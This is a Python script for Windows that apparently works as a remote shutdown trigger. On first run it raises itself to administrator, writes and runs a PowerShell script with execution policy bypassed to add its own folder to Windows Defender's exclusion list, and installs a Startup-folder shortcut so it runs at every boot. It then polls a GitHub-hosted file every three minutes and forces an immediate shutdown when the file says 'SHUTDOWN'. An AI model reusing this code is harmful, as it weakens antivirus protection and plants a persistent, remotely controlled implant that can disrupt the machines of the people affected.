import os
import subprocess
import sys
import time
import ctypes
import requests
import winshell

GITHUB_REPO_URL = "https://raw.githubusercontent.com/rikeshkumarrk/shutdown-trigger/main/trigger.txt"
SCRIPT_PATH = os.path.abspath(__file__)  # Path of the Python script to be excluded
FLAG_FILE = os.path.join(os.path.dirname(SCRIPT_PATH), 'setup_done.flag')  # Path to the flag file

def is_admin():
    """Check if the script is run as administrator"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def add_exclusion_to_windows_defender():
    """Run PowerShell script to add the script folder to Windows Defender exclusions"""
    print("Adding exclusion to Windows Defender...")
    ps_script_content = f"""
    Param (
        [string]$Path = ""
    )
    
    function Test-Admin {{
        $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
        return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    }}
    
    if (-not (Test-Admin)) {{
        Write-Host "Please run as Administrator!"
        exit
    }}
    
    Add-MpPreference -ExclusionPath $Path
    Write-Host "Added $Path to Windows Defender exclusion list."
    """
    ps_script_path = os.path.join(os.path.dirname(SCRIPT_PATH), "add_exclusion.ps1")

    # Write PowerShell script to file
    with open(ps_script_path, 'w') as f:
        f.write(ps_script_content)

    cmd = f'powershell.exe -ExecutionPolicy Bypass -File "{ps_script_path}" -Path "{os.path.dirname(SCRIPT_PATH)}"'
    print(f"Executing PowerShell command: {cmd}")
    subprocess.run(cmd, shell=True)

def add_to_startup():
    """Add the script to startup"""
    print("Adding the script to startup...")
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    shortcut_path = os.path.join(startup_folder, f"{os.path.basename(SCRIPT_PATH)}.lnk")
    
    # Create a shortcut for this script
    with winshell.shortcut(shortcut_path) as shortcut:
        shortcut.path = sys.executable  # Path to the Python executable
        shortcut.arguments = SCRIPT_PATH
        shortcut.description = "Shutdown Trigger Script"
        shortcut.working_directory = os.path.dirname(SCRIPT_PATH)
    print(f"Shortcut created at {shortcut_path}")

def shutdown_pc():
    """Shutdown the PC"""
    print("Shutting down the PC...")
    os.system("shutdown /s /t 1")

def check_github_trigger():
    """Check the GitHub file for shutdown trigger"""
    print("Checking GitHub for shutdown trigger...")
    try:
        response = requests.get(GITHUB_REPO_URL)
        if response.status_code == 200:
            content = response.text.strip()
            if content.upper() == "SHUTDOWN":
                shutdown_pc()
    except Exception as e:
        print(f"Error checking GitHub trigger: {e}")

def setup():
    """Perform setup tasks (run only once)"""
    print("Performing setup...")
    add_exclusion_to_windows_defender()  # Add exclusion to Windows Defender
    add_to_startup()  # Add the script to startup
    
    # Create a flag file to indicate setup is complete
    with open(FLAG_FILE, 'w') as f:
        f.write("Setup complete")
    print(f"Setup complete. Flag file created at {FLAG_FILE}")

if __name__ == "__main__":
    # Check for a command-line argument to indicate admin relaunch
    if len(sys.argv) > 1 and sys.argv[1] == 'admin':
        print("Running setup with admin privileges...")
        setup()
    elif not os.path.exists(FLAG_FILE):  # Check if the flag file exists
        print(f"Flag file not found at {FLAG_FILE}. Running setup...")
        if is_admin():
            setup()  # Perform the setup tasks
        else:
            print("Requesting admin privileges...")
            # Relaunch the script with admin privileges and a flag ('admin')
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{SCRIPT_PATH}" admin', None, 1)
            sys.exit(0)  # Exit after requesting admin privileges
    else:
        print(f"Setup already complete. Flag file found at {FLAG_FILE}")

    # Main loop to check for GitHub trigger every 180 seconds
    while True:
        check_github_trigger()
        time.sleep(180)
